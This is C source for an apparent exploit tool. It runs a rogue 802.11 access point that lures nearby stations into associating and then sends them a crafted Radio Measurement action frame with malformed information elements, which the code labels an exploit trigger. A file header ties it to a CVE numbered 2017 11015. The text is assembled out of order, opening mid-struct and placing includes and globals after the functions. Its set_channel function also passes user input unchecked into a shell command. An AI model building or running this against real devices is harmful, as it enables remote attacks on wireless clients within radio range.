	u_int16_t status;
} __attribute__((__packed__));
typedef struct ieee80211_authentication auth_t;

struct ieee80211_assoc_request {
	u_int16_t caps;
	u_int16_t interval;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_request assoc_req_t;

struct ieee80211_assoc_response {
	u_int16_t caps;
	u_int16_t status;
	u_int16_t id;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_response assoc_resp_t;


struct ieee80211_action {
	u_int8_t category;
	u_int8_t action;
	u_int8_t dialog;
	u_int16_t repetitions;
} __attribute__((__packed__));
typedef struct ieee80211_action action_t;


void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff);

char *mac_string(u_int8_t *mac);
void hexdump(const u_char *ptr, u_int len);
char *ssid_string(ie_t *ie);

ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left);
u_int16_t get_sequence(void);

int start_pcap(pcap_t **pcap);
int open_raw_socket(void);
int set_channel(void);

int handle_packet(const u_char *data, u_int32_t left);
int process_periodic_tasks(void);

int process_radiotap(const u_char **ppkt, u_int32_t *pleft);
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft);
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);

int send_beacon();
int send_probe_response(u_int8_t *dst_mac);
int send_auth_response(u_int8_t *dst_mac);
int send_assoc_response(u_int8_t *dst_mac);
int send_exploit_trigger(u_int8_t *dst_mac);


void usage(char *argv0)
{
	fprintf(stderr, "usage: %s [options] <ssid>\n", argv0);
	fprintf(stderr, "\nsupported options:\n\n"
			"-b             send beacons regularly (default: off)\n"
			"-c <channel>   use the specified channel (default: %d)\n"
			"-i <interface> interface to use for monitoring/injection (default: %s)\n"
			"-m <mac addr>  use the specified mac address (default: from phys)\n"
			, DEFAULT_CHANNEL, g_iface);
}


/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	char *argv0;
	int ret = 0, c;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;

	/* initalize stuff */
	srand(getpid());
	strcpy(g_iface, "mon0");

	argv0 = "jfap";
	if (argv && argc > 0 && argv[0])
		argv0 = argv[0];

	if (argc < 2) {
		usage(argv0);
		return 1;
	}

	while ((c = getopt(argc, argv, "bc:i:m:")) != -1) {
		switch (c) {
			case '?':
			case 'h':
				usage(argv0);
				return 1;

			case 'b':
				g_send_beacons = 1;
				break;

			case 'c':
				{
					int tmp = atoi(optarg);
					if (tmp < 1 || tmp > 12) {
						fprintf(stderr, "[!] invalid channel: %s\n", optarg);
						return 1;
					}

					g_channel = tmp;
				}
				break;

			case 'i':
				strncpy(g_iface, optarg, sizeof(g_iface) - 1);
				break;

			case 'm':
				{
					struct ether_addr *pe;

					pe = ether_aton(optarg);
					if (!pe) {
						fprintf(stderr, "[!] invalid mac address: %s\n", optarg);
						return 1;
					}
					memcpy(g_bssid, pe->ether_addr_octet, ETH_ALEN);
				}
				break;

			default:
				fprintf(stderr, "[!] invalid option '%c'! try -h ...\n", c);
				return 1;
				/* not reached */
				break;
		}
	}

	/* adjust params */
	argc -= optind;
	argv += optind;

	/* process required arguments */
	if (argc < 1) {
		usage(argv0);
		return 1;
	}

	strncpy((char *)g_ssid, argv[0], sizeof(g_ssid) - 1);
	g_ssid_len = strlen((char *)g_ssid);

	printf("[*] Starting access point with SSID \"%s\" via interface \"%s\"\n",
			g_ssid, g_iface);

	if (!start_pcap(&pch))
		return 1;

	if ((g_sock = open_raw_socket()) == -1)
		return 1;

	/* set the channel for the wireless card */
	if (!set_channel())
		return 1;

	while (1) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		if (pcret == -1) {
			pcap_perror(pch, "[!] Failed to get a packet");
			continue;
		}

		/* if we got a packet, process it */
		if (pcret == 1) {
			/* check the length against the capture length */
			if (pchdr->len > pchdr->caplen)
				fprintf(stderr, "[-] WARNING: truncated frame! (len: %lu > caplen: %lu)\n",
						(ulong)pchdr->len, (ulong)pchdr->caplen);

			if (!handle_packet(inbuf, pchdr->caplen)) {
				ret = 1;
				break;
			}
		}

		if (!process_periodic_tasks()) {
			ret = 1;
			break;
		}
	}

	pcap_close(pch);
	return ret;
}


/*
 * handle a single packet from the wifi nic
 */
int handle_packet(const u_char *data, u_int32_t left)
{
	dot11_frame_t *d11;

	if (!process_radiotap(&data, &left))
		return 1; /* treat errors as warnings */

	if (!(d11 = get_dot11_frame(&data, &left)))
		return 1; /* treat errors as warnings */

	/* ignore anything from us */
	if (!memcmp(d11->src_mac, g_bssid, ETH_ALEN))
		return 1; /* finished with this packet */

	/* handle retransmissions */
	if (d11->ctrlflags & CF_RETRY) {
		/* if we have a packet that we tried to send, re-send it now */
		if (g_pkt_len > 0) {
			/* don't retransmit too fast */
			struct timespec now, diff;

			if (clock_gettime(CLOCK_REALTIME, &now)) {
				perror("[!] gettimeofday failed");
				return 0;
			}

			/* see how long since the last retransmit. if it's been
			 * long enough, send again */
			timespec_diff(&now, &last_retransmit, &diff);

			if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 100000) {
#ifdef DEBUG_RETRANSMIT
				printf("[*] Re-transmitting...\n");
#endif
				if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
					perror("[!] Unable to re-send packet!");
					/* just try again later */
				}
				last_retransmit = now;
			}
		}

		/* don't process retransmission packets further */
		return 1;
	}

	/* handle broadcast packets - only probe requests */
	if (d11->type == T_MGMT && d11->subtype == ST_PROBE_REQ) {
		if (!process_probe_request(d11, data, left))
			return 1; /* finished with this packet */
		return 1; /* finished with this packet */
	}

	/* from here on out, we only handle unicast packets */
	if (memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
#ifdef DEBUG_IGNORED
		printf("[*] Ingoring 802.11 packet ver:%u type:%s subtype:%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype]);
		hexdump(data, left);
#endif
		return 1; /* finished with this packet */
	}

	if (d11->type == T_MGMT) {
		if (d11->subtype == ST_AUTH)
			return process_auth_request(d11, data, left);

		else if (d11->subtype == ST_ASSOC_REQ)
			return process_assoc_request(d11, data, left);

	} /* type check */

	else if (d11->type == T_DATA) {
		g_state = S_ESTABLISHED;
		g_pkt_len = 0;
#ifndef DEBUG_DATA
		printf("[*] Station successfully associated and is sending data...\n");
#else
		printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype],
				(d11->subtype >> 3) ? " (QoS)" : "");
		hexdump(data, left);
#endif

		if (g_state != S_EXPLOIT_SENT) {
			g_state = S_EXPLOIT_SENT;
			if (!send_exploit_trigger(d11->src_mac))
				return 0;
		}

		return 1;
	}

	/* if we didn't handle this packet somehow, we should display it */
#ifdef DEBUG_DOT11
	printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s\n",
			d11->version, dot11_types[d11->type],
			dot11_subtypes[d11->type][d11->subtype]);
	hexdump(data, left);
#endif

	return 1;
}


/*
 * handle periodic tasks that need to be done
 */
int process_periodic_tasks(void)
{
	if (g_send_beacons) {
		/* we didn't get a pcket yet, do periodic processing */
		struct timespec now, diff;

		if (clock_gettime(CLOCK_REALTIME, &now)) {
			perror("[!] clock_gettime failed");
			return 0;
		}

		/* see how long since the last beacon. if it's been long enough,
		 * send another */
		timespec_diff(&now, &last_beacon, &diff);
		if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 1000000) {
#ifdef DEBUG_BEACON_INTERVAL
			printf("%lu.%lu - %lu.%lu = %lu.%lu (vs %lu)\n",
					(ulong)now.tv_sec, now.tv_nsec,
					(ulong)last_beacon.tv_sec, last_beacon.tv_nsec,
					(ulong)diff.tv_sec, diff.tv_nsec,
					(ulong)BEACON_INTERVAL * 1000000);
#endif
			if (!send_beacon())
				return 1; /* treat error as warning */
			last_beacon = now;
		}
	} /* if (g_send_beacons) */

	return 1;
}


/*
 * try to start capturing packets from the specified interface (a wireless card
 * in monitor mode)
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap)
{
	char errorstr[PCAP_ERRBUF_SIZE];
	int datalink;

	printf("[*] Starting capture on \"%s\" ...\n", g_iface);

	*pcap = pcap_open_live(g_iface, SNAPLEN, 8, 25, errorstr);
	if (*pcap == (pcap_t *)NULL) {
		fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
		return 0;
	}

	datalink = pcap_datalink(*pcap);
	switch (datalink) {
		case DLT_IEEE802_11_RADIO:
			break;

		default:
			fprintf(stderr, "[!] Unknown datalink for interface \"%s\": %d\n",
					g_iface, datalink);
			fprintf(stderr, "    Only RADIOTAP is currently supported.\n");
			return 0;
	}

	return 1;
}


/*
 * open a raw socket that we can use to send raw 802.11 frames
 */
int open_raw_socket(void)
{
	int sock;
	struct sockaddr_ll la;
	struct ifreq ifr;

	sock = socket(PF_PACKET, SOCK_RAW, ETH_P_ALL);
	if (sock == -1) {
		perror("[!] Unable to open raw socket");
		return -1;
	}

	/* build the link-level address struct for binding */
	memset(&la, 0, sizeof(la));
	la.sll_family = AF_PACKET;
	la.sll_halen = ETH_ALEN;

	/* get the interface index */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, g_iface, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
		perror("[!] Unable to get interface index");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_INDEX
	printf("[*] Interface index: %u\n", ifr.ifr_ifindex);
#endif
	la.sll_ifindex = ifr.ifr_ifindex;

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		perror("[!] Unable to get hardware address");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_HWADDR
	printf("[*] Interface hardware address: %s\n", mac_string((u_int8_t *)ifr.ifr_hwaddr.sa_data));
#endif
	if (!memcmp(g_bssid, "\x00\x00\x00\x00\x00\x00", ETH_ALEN))
		memcpy(g_bssid, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	 memcpy(la.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	 /* verify the interface uses RADIOTAP */
	 if (ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_RADIOTAP) {
		 fprintf(stderr, "[!] bad address family: %u\n", ifr.ifr_hwaddr.sa_family);
		 close(sock);
		 return -1;
	 }

	 /* bind this socket to the interface */
	 if (bind(sock, (struct sockaddr *)&la, sizeof(la)) == -1) {
		perror("[!] Unable to bind to interface");
		close(sock);
		return -1;
	}
	return sock;
}


/*
 * set the channel of the wireless card
 */
int set_channel(void)
{
	char cmd[256] = { 0 };

	snprintf(cmd, sizeof(cmd) - 1, "iwconfig %s channel %d", g_iface, g_channel);
	if (system(cmd))
		return 0;
	return 1;
}


/*
 * process the radiotap header
 */
int process_radiotap(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;
#ifdef DEBUG_RADIOTAP_PRESENT
	int idx = 0;
	u_int32_t *pu = &prt->it_present;
#endif

	if (*pleft < sizeof(radiotap_t)) {
		fprintf(stderr, "[!] Packet doesn't have enough data for a radiotap header?!\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP
	printf("[*] got RADIOTAP packet - ver:%u pad:%u len:%u\n",
			prt->it_version, prt->it_pad, prt->it_len);
#endif
	if (*pleft <= prt->it_len) {
		fprintf(stderr, "[!] Packet is too small to contain the radiotap header and data\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP_PRESENT
	printf("    present[%u]: 0x%lx\n", idx, (ulong)prt->it_present);
	while (prt->it_present & 0x1) {
		++idx;
		printf("    present[%u]: 0x%lx\n", idx, (ulong)pu[idx]);
	}
#endif

	*ppkt = p + prt->it_len;
	*pleft -= prt->it_len;

	return 1;
}


/*
 * process the 802.11 frame
 */
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;

	if (*pleft < sizeof(dot11_frame_t)) {
#ifdef DEBUG_DOT11_SHORT_PKTS
		fprintf(stderr, "[-] Not enough data for 802.11 frame header (bytes left: %u)!\n", *pleft);
		hexdump(p, *pleft);
#endif
		return NULL;
	}

	*ppkt = p + sizeof(dot11_frame_t);
	*pleft -= sizeof(dot11_frame_t);

	return (dot11_frame_t *)p;
}


/*
 * process an 802.11 probe request
 */
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	ie_t *ie;
	char ssid_req[32] = { 0 };

	if (!(ie = get_ssid_ie(data, left))) {
		fprintf(stderr, "[-] Probe request with no SSID encountered!\n");
		return 1; /* just a warning */
	}

	/* the ssid might be empty, or might be too long */
	if (ie->len > 0)
		strcpy(ssid_req, ssid_string(ie));

	/* there are broadcast and unicast probe requests... */
	if (!memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
		/* for us!? */
#ifndef DONT_CHECK_SSID_ON_UNICAST
		if (!strcmp(ssid_req, (char *)g_ssid)) {
			printf("[*] (%s) Probe request for our BSSID and SSID, replying...\n", mac_string(d11->src_mac));
			g_state = S_SENT_PROBE_RESP;
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
#else
		printf("[*] (%s) Probe request for our BSSID, replying...\n", mac_string(d11->src_mac));
		g_state = S_SENT_PROBE_RESP;
		if (!send_probe_response(d11->src_mac))
			return 1; /* treat send errors as a warning */
#endif
	} else if (!memcmp(d11->dst_mac, IEEE80211_BROADCAST_ADDR, ETH_ALEN)) {
		/* broadcast probe request - discovery? */
		/* NOTE: this is the active-scan equivalent of a beacon -- no state change here */
		if (ie && ie->len > 0) {
			/* we must check the SSID on broadcast probes */
			if (!strcmp(ssid_req, (char *)g_ssid)) {
				printf("[*] (%s) Broadcast probe request for our SSID \"%s\" received, replying...\n", mac_string(d11->src_mac), ssid_req);
				if (!send_probe_response(d11->src_mac))
					return 1; /* treat send errors as a warning */
			} else {
				printf("[*] (%s) Broadcast probe request for \"%s\" received, NOT replying...\n", mac_string(d11->src_mac), ssid_req);
			}
		} else {
			printf("[*] (%s) Broadcast probe request received, replying...\n", mac_string(d11->src_mac));
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
	} /* mac check */
	else {
		if (ie->len > 0) {
			printf("[*] (%s) Unhandled probe request for SSID (%u bytes): \"%s\"\n", mac_string(d11->src_mac), ie->len, ssid_req);
		} else {
			printf("[*] (%s) Unhandled probe request for empty SSID\n", mac_string(d11->src_mac));
		}
	}
	return 1;
}


/*
 * process an 802.11 authentication request
 */
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	auth_t *auth;

	if (left < sizeof(auth_t)) {
		fprintf(stderr, "[-] (%s) Auth request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}

	auth = (auth_t *)data;
	if (auth->seq != 1) {
		fprintf(stderr, "[-] Authentication sequence is not 0x0001 !!\n");
	}

	printf("[*] (%s) Auth request received (alg:0x%x, seq:%u, status:%u), replying...\n",
			mac_string(d11->src_mac),
			auth->algorithm, auth->seq, auth->status);

	g_state = S_SENT_AUTH;
	if (!send_auth_response(d11->src_mac))
		return 1; /* treat send errors as a warning */

	return 1;
}


/*
 * process an 802.11 association request destined for us
 */
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	assoc_req_t *assoc;
	ie_t *ie;

	if (left < sizeof(assoc_req_t)) {
		fprintf(stderr, "[-] (%s) Association request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}
	assoc = (assoc_req_t *)data;

	data += sizeof(assoc_req_t);
	left -= sizeof(assoc_req_t);

	if (!(ie = get_ssid_ie(data, left))) {
		printf("[*] (%s) Association request without SSID received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				assoc->caps, assoc->interval);
	} else {
		printf("[*] (%s) Association request for \"%s\" received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				ssid_string(ie),
				assoc->caps, assoc->interval);
	}

	g_state = S_SENT_ASSOC_RESP;
	if (!send_assoc_response(d11->src_mac))
		return 1; /* treat send errors as a warning */
	return 1;
}


/*
 * send an 802.11 packet with a bunch of re-transmissions for the fuck of it
 */
int send_packet(dot11_frame_t *d11)
{
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
		perror("[!] Unable to send packet!");
		return 0;
	}

	/* set the retransmit flag on the 802.11 header */
	d11->ctrlflags |= CF_RETRY;

	return 1;
}


/*
 * fill the radio tap header in for a packet
 */
void fill_radiotap(u_int8_t **ppkt)
{
	u_int8_t *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;

	/* fill out the radio tap header */
	prt->it_version = 0;
	prt->it_len = sizeof(*prt) + 1;
	prt->it_present = (1 << IEEE80211_RADIOTAP_RATE);

	p += sizeof(radiotap_t);

	/* add the data rate (data of the radiotap header) */
	*p++ = 0x4;  // 2Mb/s

	*ppkt = p;
}


/*
 * fill the 802.11 frame header
 */
void fill_dot11(u_int8_t **ppkt, u_int8_t type, u_int8_t subtype, u_int8_t *dst_mac)
{
	dot11_frame_t *d11 = (dot11_frame_t *)(*ppkt);

	/* add the 802.11 header */
	d11->version = 0;
	d11->type = type;
	d11->subtype = subtype;
	d11->ctrlflags = 0;
	d11->duration = 0;
	memcpy(d11->dst_mac, dst_mac, ETH_ALEN);
	memcpy(d11->src_mac, g_bssid, ETH_ALEN);
	memcpy(d11->bssid, g_bssid, ETH_ALEN);
	d11->seq = get_sequence();
	d11->frag = 0;

	*ppkt += sizeof(dot11_frame_t);
}


/*
 * fill in an information element
 */
void fill_ie(u_int8_t **ppkt, u_int8_t id, u_int8_t *data, u_int8_t len)
{
	u_int8_t *p = *ppkt;
	ie_t *ie = (ie_t *)p;

	/* add the ssid IE */
	ie->id = id;
	ie->len = len;

	p = (u_int8_t *)(ie + 1);
	memcpy(p, data, len);

	p += len;
	*ppkt = p;
}


/*
 * send a beacon frame to announce our network
 */
int send_beacon()
{
	u_int8_t pkt[4096] = { 0 }, *p = pkt;
	beacon_t *bc;

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_BEACON, IEEE80211_BROADCAST_ADDR);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	/* don't retransmit beacons */
	if (send(g_sock, pkt, p - pkt, 0) == -1) {
		perror("[!] Unable to send beacon!");
		return 0;
	}

	//printf("[*] Sent beacon!\n");
	return 1;
}


/*
 * send a probe response to the specified sender
 */
int send_probe_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	beacon_t *bc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_PROBE_RESP, dst_mac);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent probe response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an authentication response
 */
int send_auth_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	auth_t *auth;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_AUTH, dst_mac);

	/* add the auth info */
	auth = (auth_t *)p;
	auth->algorithm = 0; // AUTH_OPEN;
	auth->seq = 2; // should be responding to auth seq 1
	auth->status = 0; // successful
	p = (u_int8_t *)(auth + 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent auth response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an association response
 */
int send_assoc_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	assoc_resp_t *assoc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_ASSOC_RESP, dst_mac);

	/* add the assoc info */
	assoc = (assoc_resp_t *)p;
	assoc->caps = 1;
	assoc->status = 0; // successful
	assoc->id = 1;
	p = (u_int8_t *)(assoc + 1);

	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent association response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an action frame containing a trigger for the exploit
 */
int send_exploit_trigger(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	action_t *action;
	int i;
	u_int8_t measure_data[] = {
		0xff, 0xff, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x00,
		0x00, 0xAA, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, /* 16 */
		0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 32 */
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 48 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 64 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 80 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 96 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 112 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA  /* 128 */
	};

	u_int8_t AP_CHANEL_REP[] = {
		0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA

	};

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_ACTION, dst_mac);

	action = (action_t *)p;
	action->category = 0x05; // Radio Measurement
	action->action = 0x00; // action: Radio Measurement request
	action->dialog = 0x0f; // ??
	action->repetitions = 0; // ??
	p = (u_int8_t *)(action + 1);

	//for (i = 0; i < 1; i++)
	fill_ie(&p, 38, measure_data, sizeof(measure_data));
	fill_ie(&p, 51, AP_CHANEL_REP, sizeof(AP_CHANEL_REP));
	fill_ie(&p, 51, AP_CHANEL_REP, sizeof(AP_CHANEL_REP));

	g_pkt_len = p - g_pkt;
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1)
		return 0;

	printf("[*] Sent action frame to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * process the information elements looking for an SSID
 */
ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left)
{
	ie_t *ie;
	const u_int8_t *p = data;
	u_int32_t rem = left;

#ifdef DEBUG_GET_SSID_IE
	printf("[*] processing information element data:\n");
	hexdump(data, left);
#endif

	while (rem > 0) {
		/* see if we have enough for the IE header */
		if (rem < sizeof(*ie)) {
			fprintf(stderr, "[-] Not enough data for an IE!\n");
			return NULL;
		}

		ie = (ie_t *)p;

		/* advance... */
		p += sizeof(*ie);
		rem -= sizeof(*ie);

		/* now, is it an SSID ? */
		if (ie->id == IEID_SSID) {
			return ie;
		}

		/* check if we have all the data */
		if (rem < ie->len) {
			fprintf(stderr, "[-] Not enough data for the IE's data!\n");
			return NULL;
		}

		/* advance past the ie->data */
		p += ie->len;
		rem -= ie->len;
	}

#ifdef DEBUG_GET_SSID_IE
	fprintf(stderr, "[-] SSID IE not found!\n");
#endif
	return NULL;
}


/*
 * create the ascii representation of the specified mac address
 */
char *mac_string(u_int8_t *mac)
{
	static char mac_str[32];
	char *p = mac_str;
	int i;

	for (i = 0; i < ETH_ALEN; i++) {
		u_int8_t hi = mac[i] >> 4;
		u_int8_t lo = mac[i] & 0xf;

		if (hi > 9)
			*p++ = hi - 10 + 'a';
		else
			*p++ = hi + '0';
		if (lo > 9)
			*p++ = lo - 10 + 'a';
		else
			*p++ = lo + '0';
		if (i < ETH_ALEN - 1)
			*p++ = ':';
	}
	*p = '\0';

	return mac_str;
}


/*
 * return the ssid string, ensuring truncation and nul termination
 */
char *ssid_string(ie_t *ie)
{
	static char ssid_str[32];

	if (ie->len > sizeof(ssid_str) - 1)
		strncpy(ssid_str, (char *)ie->data, sizeof(ssid_str) - 1);
	else
		strncpy(ssid_str, (char *)ie->data, ie->len);
	return ssid_str;
}


/*
 * handle sequence number generation
 */
u_int16_t get_sequence(void)
{
	static u_int16_t sequence = 1337;
	uint16_t ret = sequence;

	sequence++;
	if (sequence > 4095)
		sequence = 0;
	return ret;
}


/*
 * diff two timespec values
 */
void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff)
{
	diff->tv_sec = newer->tv_sec - older->tv_sec;
	diff->tv_nsec = newer->tv_nsec - older->tv_nsec;
	if (diff->tv_nsec < 0) {
		--diff->tv_sec;
		diff->tv_nsec += 1000000000;
	}
}

```

`wifi/CVE-2017.11015.c`:

```c
/*
 * sbauer's 80211 station based on @jduck 's jfap
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

/* hi-res time */
#include <time.h>

/* internet networking / packet sending */
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <linux/if.h>
#include <linux/if_packet.h>

/* packet capturing */
#include <pcap/pcap.h>


/* global hardcoded parameters */
#define SNAPLEN 4096
#define BEACON_INTERVAL 500
#define DEFAULT_CHANNEL 1


/* some bits borrowed from tcpdump! thanks guys! */
#define T_MGMT 0x0  /* management */
#define T_CTRL 0x1  /* control */
#define T_DATA 0x2  /* data */
#define T_RESV 0x3  /* reserved */

#define ST_ASSOC_REQ 0
#define ST_ASSOC_RESP 1
#define ST_PROBE_REQ 4
#define ST_PROBE_RESP 5
#define ST_BEACON 8
#define ST_AUTH 11
#define ST_ACTION 13

#define CF_RETRY 8

#define IEID_SSID 0
#define IEID_RATES 1
#define IEID_DSPARAMS 3
#define IEID_RIC_DATADESC 57

#define IEEE80211_RADIOTAP_RATE 2

#define IEEE80211_BROADCAST_ADDR ((u_int8_t *)"\xff\xff\xff\xff\xff\xff")


const char *dot11_types[4] = { "mgmt", "ctrl", "data", "resv" };
const char *dot11_subtypes[4][16] = {
	/* mgmt */
	{ "assoc-req", "assoc-resp",
		"re-assoc-req", "re-assoc-resp",
		"probe-req", "probe-resp",
		"6?", "7?",
		"beacon", "atim",
		"dis-assoc", "auth",
		"de-auth", "action",
		"14?", "15?" },
	/* ctrl */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?",
		"8?", "block-ack", "ps-poll", "rts", "cts", "ack", "cf-end", "cf-end-ack" },
	/* data */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" },
	/* reserved */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" }
};

static int g_sock;
static char g_iface[64];

u_int8_t g_bssid[ETH_ALEN];
u_int8_t g_ssid[32];
u_int8_t g_ssid_len;
u_int8_t g_channel = DEFAULT_CHANNEL;

u_int8_t g_pkt[4096];
size_t g_pkt_len = 0;
struct timespec last_retransmit;

/* global options */
int g_send_beacons = 0;
struct timespec last_beacon;

typedef enum {
	S_AWAITING_PROBE_REQ = 0,
	S_SENT_PROBE_RESP = 1,
	S_SENT_AUTH = 2,
	S_SENT_ASSOC_RESP = 3,
	S_ESTABLISHED = 4,
	S_EXPLOIT_SENT = 5
} state_t;

